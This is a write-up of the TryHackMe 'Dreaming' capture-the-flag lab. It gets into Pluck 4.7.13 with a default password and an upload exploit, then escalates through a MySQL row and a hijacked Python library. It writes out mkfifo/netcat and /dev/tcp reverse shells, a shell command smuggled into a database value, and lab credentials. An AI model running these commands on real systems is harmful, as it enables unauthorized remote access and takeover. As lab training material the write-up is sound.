<h1>Dreaming – TryHackMe Challenge Writeup</h1>
A writeup documenting the complete Dreaming TryHackMe challenge, covering enumeration, exploitation of Pluck 4.7.13, gaining a reverse shell, SSH access, privilege escalation through MySQL, and finally obtaining higher-level access.<br><br>

Tools:<br>
•	Nmap<br>
•	Gobuster<br>
•	Linux Command-line <br><br>

Started with an nmap scan:<br>
<code>nmap -sC -sV 10.49.145.68</code><br><br>
<img alt="image" src="images/Dream1.png"/><br><br>
Then I looked for more directories using gobuster:<br>
<code>gobuster dir -u http://10.49.145.68 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt</code><br><br>
<img alt="image" src="images/Dream2.png"/><br><br>

So I navigated to /app:<br><br>
<img alt="image" src="images/Dream3.png"/><br><br>

Then to pluck-4.7.13/ which led me to a website with only one line:<br><br>
<img alt="image" src="images/Dream4.png"/><br><br>

Admin at the bottom was clickable so I clicked on it and it took me to a login page which takes only password input:<br><br>
<img alt="image" src="images/Dream5.png"/><br><br>

I searched up Pluck 4.7.13 vulnerabilities and it was a remote file execution vulnerability. So I searched up default pluck 4.7.13 passwords which turned out to be just <code>password</code>. Just like that, I entered the website.<br><br>
<img alt="image" src="images/Dream6.png"/><br><br>

I navigated to /upload from the url. I could manage files from there.<br><br>
<img alt="image" src="images/Dream7.png"/><br><br>

Now, I can exploit pluck4.7.13 vulnerabilities.<br>
I looked up for any payloads for this vulnerability, exploit 49909 was the one.<br>
I downloaded the script using:<br>
<code>searchsploit -m php/webapps/49909.py</code><br>
I uploaded this file. <br><br>
<img alt="image" src="images/Dream8.png"/><br><br>

Let’s go to the website this shows.<br><br>
<img alt="image" src="images/Dream9.png"/><br><br>

Now here I can execute my reverse shell commands.<br>
I set up a listener and executed the script:<br>
<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP 80 >/tmp/f</code><br>
The netcat got the reverse shell.<br><br>
<img alt="image" src="images/Dream10.png"/><br><br>

This says permission denied. So there’s more to it.<br><br>
<img alt="image" src="images/Dream11.png"/><br><br>
<img alt="image" src="images/Dream12.png"/><br><br>

We just got lucien’s credentials. Now we can ssh into the account.<br>
First, I had to fix how the reverse shell is.<br>
<code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code><br>
Now, it displays normal shell prompt.<br>
Then I connected to his account through ssh:<br>
<code>ssh lucien@10.48.153.70 -oHostKeyAlgorithms=+ssh-rsa</code><br>
Pasted the password <code>HeyLucien#@1999!</code> and got access.<br><br>
<img alt="image" src="images/Dream13.png"/><br><br>

<h2>Death Flag:</h2>
I tried to become the root user using sudo -l and found this:<br><br>
<img alt="image" src="images/Dream14.png"/><br><br>
Then I got to bash_history where I found:<br>
<code>mysql -u lucien -plucien42DBPASSWORD</code><br>
Upon entering this into the terminal, I immediately got access to mysql server.<br><br>
<img alt="image" src="images/Dream15.png"/><br><br>

<code>INSERT INTO dreams (dreamer, dream) VALUES ('NoBody', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f)');</code><br><br>
<img alt="image" src="images/Dream16.png"/><br><br>
Then I exited and performed a reverse shell execution:<br>
<code>sudo -u death /usr/bin/python3 /home/death/getDreams.py</code><br><br>
<img alt="image" src="images/Dream17.png"/><br><br>

Listener on port 4444 caught the reverse shell and I became death.<br><br>
<img alt="image" src="images/Dream18.png"/><br><br>

<h2>Morpheus Flag:</h2>
<img alt="image" src="images/Dream19.png"/><br><br>
So I explored restore.py file:<br><br>
<img alt="image" src="images/Dream20.png"/><br><br>
<code>echo "import os;os.system(\"bash -c 'bash -i >& /dev/tcp/YOUR_IP/1234 0>&1'\")" > /usr/lib/python3.8/shutil.py</code><br><br>
<img alt="image" src="images/Dream21.png"/><br><br>
And just like that, I solved Dreaming Challenge on TryHackMe Challenges!
